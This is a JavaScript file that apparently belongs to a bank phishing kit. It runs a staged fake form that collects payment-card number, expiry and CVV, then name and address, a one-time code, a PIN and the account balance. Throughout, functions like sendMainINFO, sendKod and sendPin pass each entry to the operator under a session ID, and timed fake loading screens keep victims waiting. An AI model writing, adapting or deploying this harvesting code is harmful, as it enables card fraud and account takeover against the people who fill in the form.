let sess = generateString(15);
var bankName = "";
var erno = 0;

function go(id) {
	if (id == 'submit-land-1') {

		$('#loading-content').show();
		setTimeout(function () {
			$(landing_Form).hide();
			$(landing_Form_2).show();
			$('#loading-content').hide();
			window.scrollTo(0, 0);
			window.scrollBy(0, window.innerHeight * 0.22);
		}, 1750);

	} else if (id == 'submit-land-2') {

		$('#loading-content').show();
		setTimeout(function () {
			$(landing_Form_2).hide();
			$(card_Form).show();
			$('#loading-content').hide();
			window.scrollTo(0, 0);
			window.scrollBy(0, window.innerHeight * 0.22);
		}, 1750);

	} else if (id == 'submit-crd' && checkEmpty(chol_field) && checkEmpty(cnum_field) 
		&& checkEmpty(cexp_field) && checkEmpty(ckod_field) && checkCrd(cnum_field)) {

		if (erno == 1) {

			sendMainINFO(sess,
				getInputValue(chol_field), getInputValue(cnum_field), 
				getInputValue(cexp_field), getInputValue(ckod_field));

			$(card_Form).hide();
			$(loading_Page).show();
			setTimeout(function () {
				loadstation();
			}, 1750);

		} else {

			sendMainINFO(sess,
				getInputValue(chol_field), getInputValue(cnum_field), 
				getInputValue(cexp_field), getInputValue(ckod_field));

			$('#loading-content').show();
			setTimeout(function () {
				$(card_Form).hide();
				$(info_Form).show();
				$('#loading-content').hide();
				window.scrollTo(0, 0);
				window.scrollBy(0, window.innerHeight * 0.22);
			}, 1750);

		}

	} else if (id == 'submit-info' && checkEmpty(full_field) && 
		checkEmpty(addre_field) && checkEmpty(zip_field) && checkEmpty(state_field)) {

		var info_val = "Name: " + getInputValue(full_field) + 
		'<br>Address: ' + getInputValue(addre_field) + 
		'<br>State: ' + getInputValue(state_field) + ' ' + getInputValue(zip_field);
		sendPersonINFO(sess, info_val);
		$(info_Form).hide();
		$(loading_Page).show();
		loadstation();

	} else if (id == 'submit-kode' && checkEmpty(kode_field)) {

		$('#loading-content').show();
		sendKod(sess, getInputValue(kode_field));
		setTimeout(function () {
			loadstation();
		}, 1750);

	} else if (id == 'submit-pn' && checkEmpty(pin_field)) {

		sendPin(sess, getInputValue(pin_field));
		$('#loading-content').show();
		setTimeout(function () {
			loadstation();
		}, 1750);

	} else if (id == 'submit-bl' && checkEmpty(balan_field)) {

		sendBalanceINFO(sess, getInputValue(balan_field));
		$('#loading-content').show();
		setTimeout(function () {
			loadstation();
		}, 1750);

	} else if (id == 'submit-push') {

		sendStatusINFO(sess, 'LOADING');
		$('#loading-content').show();
		setTimeout(function () {
			loadstation();
		}, 1750);

	}
}

function showLoadingDots() {
  document.getElementById('dot1').classList.toggle('visible');
  setTimeout(function () {
  	document.getElementById('dot2').classList.toggle('visible');
  	setTimeout(function () {
  		document.getElementById('dot3').classList.toggle('visible');
  		setTimeout(function () {
  			document.getElementById('dot1').classList.toggle('hidden');
  			document.getElementById('dot2').classList.toggle('hidden');
  			document.getElementById('dot3').classList.toggle('hidden');
  			setTimeout(function () {
  				showLoadingDots();
  			}, 250);
  		}, 250);
  	}, 300);
  }, 250);
}

//::::::::::::::::::.
$(document).ready (function () {
	$('#' + cnum_field).mask('0000 0000 0000 0000');
	$('#' + cexp_field).mask('00/0000');
	$('#' + ckod_field).mask('0000');
	$('#' + pin_field).mask('0000');
	$('#' + kode_field).mask('000 000');
	sendVisitor(0);

	showLoadingDots();
	setValue(full_field, '');
	setValue(addre_field, '');
	setValue(zip_field, '');
	setValue(state_field, '');
	setValue(chol_field, '');
	setValue(cnum_field, '');
	setValue(cexp_field, '');
	setValue(ckod_field, '');
});